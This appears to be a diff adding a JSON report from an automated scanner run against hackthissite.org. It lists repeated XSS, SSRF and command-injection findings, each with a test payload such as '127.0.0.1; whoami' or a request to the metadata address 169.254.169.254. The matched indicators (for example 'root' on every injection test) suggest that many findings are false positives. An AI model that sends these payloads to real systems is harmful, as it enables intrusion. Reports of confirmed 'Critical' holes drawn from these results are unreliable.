@@ -1,0 +1,952 @@
+{
+  "target": "https://www.hackthissite.org/",
+  "scan_date": "2026-08-10T23:56:59.114047",
+  "total_findings": 135,
+  "findings": [
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/?q=<script>alert(1)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<img src=x onerror=alert(1)>",
+      "url": "https://www.hackthissite.org/?q=<img src=x onerror=alert(1)>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<img src=x onerror=alert(1)>",
+      "url": "https://www.hackthissite.org/?q=<img src=x onerror=alert(1)>",
+      "indicator": "onerror="
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "javascript:alert(1)",
+      "url": "https://www.hackthissite.org/?q=javascript:alert(1)",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "javascript:alert(1)",
+      "url": "https://www.hackthissite.org/?q=javascript:alert(1)",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/?q=\"><script>alert(1)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "'><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/?q='><script>alert(1)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(document.cookie)</script>",
+      "url": "https://www.hackthissite.org/?comment=<script>alert(document.cookie)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(document.cookie)</script>",
+      "url": "https://www.hackthissite.org/?comment=<script>alert(document.cookie)</script>",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org/?comment=<svg onload=alert(1)>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org/?comment=<svg onload=alert(1)>",
+      "indicator": "onload="
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org/?comment=<svg onload=alert(1)>",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org/?comment=<body onload=alert(1)>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org/?comment=<body onload=alert(1)>",
+      "indicator": "onload="
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org/?comment=<body onload=alert(1)>",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "url": "https://www.hackthissite.org/?url=http://169.254.169.254/latest/meta-data/",
+      "indicator": "169.254.169.254"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://127.0.0.1:8080/admin",
+      "url": "https://www.hackthissite.org/?url=http://127.0.0.1:8080/admin",
+      "indicator": "127.0.0.1"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://localhost:22",
+      "url": "https://www.hackthissite.org/?url=http://localhost:22",
+      "indicator": "localhost"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://169.254.169.254/",
+      "url": "https://www.hackthissite.org/?webhook=http://169.254.169.254/",
+      "indicator": "169.254.169.254"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://localhost:8080/internal",
+      "url": "https://www.hackthissite.org/?webhook=http://localhost:8080/internal",
+      "indicator": "localhost"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://localhost:8080/internal",
+      "url": "https://www.hackthissite.org/?webhook=http://localhost:8080/internal",
+      "indicator": "internal"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; whoami",
+      "url": "https://www.hackthissite.org/?host=127.0.0.1; whoami",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| whoami",
+      "url": "https://www.hackthissite.org/?host=127.0.0.1| whoami",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1 && whoami",
+      "url": "https://www.hackthissite.org/?host=127.0.0.1 && whoami",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; id",
+      "url": "https://www.hackthissite.org/?host=127.0.0.1; id",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| id",
+      "url": "https://www.hackthissite.org/?host=127.0.0.1| id",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8; ls",
+      "url": "https://www.hackthissite.org/?ping=8.8.8.8; ls",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8| ls",
+      "url": "https://www.hackthissite.org/?ping=8.8.8.8| ls",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8 && pwd",
+      "url": "https://www.hackthissite.org/?ping=8.8.8.8 && pwd",
+      "indicator": "root"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(1)</script>",
+      "url": "https://www.hackthissite.org?q=<script>alert(1)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<img src=x onerror=alert(1)>",
+      "url": "https://www.hackthissite.org?q=<img src=x onerror=alert(1)>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<img src=x onerror=alert(1)>",
+      "url": "https://www.hackthissite.org?q=<img src=x onerror=alert(1)>",
+      "indicator": "onerror="
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "javascript:alert(1)",
+      "url": "https://www.hackthissite.org?q=javascript:alert(1)",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "javascript:alert(1)",
+      "url": "https://www.hackthissite.org?q=javascript:alert(1)",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org?q=\"><script>alert(1)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "'><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org?q='><script>alert(1)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(document.cookie)</script>",
+      "url": "https://www.hackthissite.org?comment=<script>alert(document.cookie)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(document.cookie)</script>",
+      "url": "https://www.hackthissite.org?comment=<script>alert(document.cookie)</script>",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org?comment=<svg onload=alert(1)>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org?comment=<svg onload=alert(1)>",
+      "indicator": "onload="
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org?comment=<svg onload=alert(1)>",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org?comment=<body onload=alert(1)>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org?comment=<body onload=alert(1)>",
+      "indicator": "onload="
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org?comment=<body onload=alert(1)>",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "url": "https://www.hackthissite.org?url=http://169.254.169.254/latest/meta-data/",
+      "indicator": "169.254.169.254"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://127.0.0.1:8080/admin",
+      "url": "https://www.hackthissite.org?url=http://127.0.0.1:8080/admin",
+      "indicator": "127.0.0.1"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://localhost:22",
+      "url": "https://www.hackthissite.org?url=http://localhost:22",
+      "indicator": "localhost"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://169.254.169.254/",
+      "url": "https://www.hackthissite.org?webhook=http://169.254.169.254/",
+      "indicator": "169.254.169.254"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://localhost:8080/internal",
+      "url": "https://www.hackthissite.org?webhook=http://localhost:8080/internal",
+      "indicator": "localhost"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://localhost:8080/internal",
+      "url": "https://www.hackthissite.org?webhook=http://localhost:8080/internal",
+      "indicator": "internal"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; whoami",
+      "url": "https://www.hackthissite.org?host=127.0.0.1; whoami",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| whoami",
+      "url": "https://www.hackthissite.org?host=127.0.0.1| whoami",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1 && whoami",
+      "url": "https://www.hackthissite.org?host=127.0.0.1 && whoami",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; id",
+      "url": "https://www.hackthissite.org?host=127.0.0.1; id",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| id",
+      "url": "https://www.hackthissite.org?host=127.0.0.1| id",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8; ls",
+      "url": "https://www.hackthissite.org?ping=8.8.8.8; ls",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8| ls",
+      "url": "https://www.hackthissite.org?ping=8.8.8.8| ls",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8 && pwd",
+      "url": "https://www.hackthissite.org?ping=8.8.8.8 && pwd",
+      "indicator": "root"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/discord?q=<script>alert(1)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<img src=x onerror=alert(1)>",
+      "url": "https://www.hackthissite.org/discord?q=<img src=x onerror=alert(1)>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<img src=x onerror=alert(1)>",
+      "url": "https://www.hackthissite.org/discord?q=<img src=x onerror=alert(1)>",
+      "indicator": "onerror="
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "javascript:alert(1)",
+      "url": "https://www.hackthissite.org/discord?q=javascript:alert(1)",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "javascript:alert(1)",
+      "url": "https://www.hackthissite.org/discord?q=javascript:alert(1)",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/discord?q=\"><script>alert(1)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "'><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/discord?q='><script>alert(1)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(document.cookie)</script>",
+      "url": "https://www.hackthissite.org/discord?comment=<script>alert(document.cookie)</script>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(document.cookie)</script>",
+      "url": "https://www.hackthissite.org/discord?comment=<script>alert(document.cookie)</script>",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org/discord?comment=<svg onload=alert(1)>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org/discord?comment=<svg onload=alert(1)>",
+      "indicator": "onload="
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org/discord?comment=<svg onload=alert(1)>",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org/discord?comment=<body onload=alert(1)>",
+      "indicator": "alert("
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org/discord?comment=<body onload=alert(1)>",
+      "indicator": "onload="
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org/discord?comment=<body onload=alert(1)>",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "url": "https://www.hackthissite.org/discord?url=http://169.254.169.254/latest/meta-data/",
+      "indicator": "169.254.169.254"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://127.0.0.1:8080/admin",
+      "url": "https://www.hackthissite.org/discord?url=http://127.0.0.1:8080/admin",
+      "indicator": "127.0.0.1"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://localhost:22",
+      "url": "https://www.hackthissite.org/discord?url=http://localhost:22",
+      "indicator": "localhost"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://169.254.169.254/",
+      "url": "https://www.hackthissite.org/discord?webhook=http://169.254.169.254/",
+      "indicator": "169.254.169.254"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://localhost:8080/internal",
+      "url": "https://www.hackthissite.org/discord?webhook=http://localhost:8080/internal",
+      "indicator": "localhost"
+    },
+    {
+      "rule": "Server-Side Request Forgery (SSRF) Detection",
+      "severity": "High",
+      "payload": "http://localhost:8080/internal",
+      "url": "https://www.hackthissite.org/discord?webhook=http://localhost:8080/internal",
+      "indicator": "internal"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; whoami",
+      "url": "https://www.hackthissite.org/discord?host=127.0.0.1; whoami",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| whoami",
+      "url": "https://www.hackthissite.org/discord?host=127.0.0.1| whoami",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1 && whoami",
+      "url": "https://www.hackthissite.org/discord?host=127.0.0.1 && whoami",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; id",
+      "url": "https://www.hackthissite.org/discord?host=127.0.0.1; id",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| id",
+      "url": "https://www.hackthissite.org/discord?host=127.0.0.1| id",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8; ls",
+      "url": "https://www.hackthissite.org/discord?ping=8.8.8.8; ls",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8| ls",
+      "url": "https://www.hackthissite.org/discord?ping=8.8.8.8| ls",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8 && pwd",
+      "url": "https://www.hackthissite.org/discord?ping=8.8.8.8 && pwd",
+      "indicator": "root"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<img src=x onerror=alert(1)>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "javascript:alert(1)",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "'><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(document.cookie)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; whoami",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| whoami",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1 && whoami",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; id",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| id",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8; ls",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8| ls",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8 && pwd",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<img src=x onerror=alert(1)>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "javascript:alert(1)",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "'><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(document.cookie)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; whoami",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| whoami",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1 && whoami",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; id",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| id",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8; ls",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8| ls",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8 && pwd",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<img src=x onerror=alert(1)>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "javascript:alert(1)",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "'><script>alert(1)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<script>alert(document.cookie)</script>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<svg onload=alert(1)>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Cross-Site Scripting (XSS) Detection",
+      "severity": "High",
+      "payload": "<body onload=alert(1)>",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "javascript:"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; whoami",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| whoami",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1 && whoami",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1; id",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "127.0.0.1| id",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8; ls",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8| ls",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    },
+    {
+      "rule": "Command Injection Detection",
+      "severity": "Critical",
+      "payload": "8.8.8.8 && pwd",
+      "url": "https://www.hackthissite.org/user/login",
+      "indicator": "root"
+    }
+  ]
+}
